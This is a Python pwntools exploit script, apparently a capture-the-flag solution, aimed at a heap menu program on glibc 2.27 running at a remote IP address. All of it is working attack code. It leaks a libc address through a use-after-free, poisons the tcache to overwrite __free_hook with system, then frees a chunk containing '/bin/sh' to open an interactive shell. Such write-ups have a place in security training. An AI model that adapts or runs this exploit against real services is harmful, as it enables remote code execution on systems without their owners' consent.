#!/usr/bin/env python3

from pwn import *

exe = ELF("./task2_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe

def conn():
    r = process([exe.path])
    return r

#r = conn()
r  = remote("40.71.72.198", 1235)

def sl(a):
    r.sendlineafter(">> ", a)

def s(a):
    r.sendafter(">> ", a)

def malloc(index, size, data="MAHER"):
    sl("1")
    sl(str(index))
    sl(str(size))
    s(data)

def edit(index, data):
    sl("3")
    sl(str(index))
    s(data)

def view(index):
    sl("4")
    sl(str(index))

def free(index):
    sl("2")
    sl(str(index))


def main():

    for i in range(8):
        malloc(i, 0x88) # 0 - 7
    
    for i in range(7, -1, -1):
        free(i)
    
    
    view(0)
    
    libc_leak = u64(r.recv(6) + p16(0))
    log.warn("Libc leak @ 0x%x", libc_leak)
    libc.address = libc_leak - libc.sym['main_arena'] - 96

    malloc(9, 0x60)
    malloc(10, 0x60)
    free(10)
    free(9)
    pause()
    edit(9, p64(libc.sym['__free_hook'])[0:6])
    pause()
    malloc(11, 0x60, b"/bin/shh\x00")
    malloc(12, 0x60, p64(libc.sym['system'])[0:6] + b"M")

    free(11)
    
    r.interactive()


if __name__ == "__main__":
    main()
